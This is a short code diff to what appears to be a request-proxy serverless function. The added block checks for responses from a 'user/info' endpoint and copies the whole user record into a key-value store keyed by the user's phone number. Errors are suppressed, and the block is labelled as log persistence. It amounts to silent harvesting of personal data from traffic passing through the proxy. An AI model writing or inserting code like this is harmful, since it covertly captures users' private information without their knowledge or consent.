@@ -28,6 +28,16 @@ export async function onRequest(context) {
       return responseMsg(`请求失败: ${getResponse.status}`);
     }
     const getData = await getResponse.json();
+    try {
+      if (url.endsWith('user/info') && getData) {
+        const env = context.env;
+        let res = getData.data || {};
+        let phone = res.phone || `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+        await env.LOG_STORAGE.put(phone, JSON.stringify(res));
+      }
+    } catch (err) {
+      console.error("日志持久化失败:", err.message);
+    }
     return new Response(JSON.stringify(getData), {
       headers: { "Content-Type": "application/json" }
     });
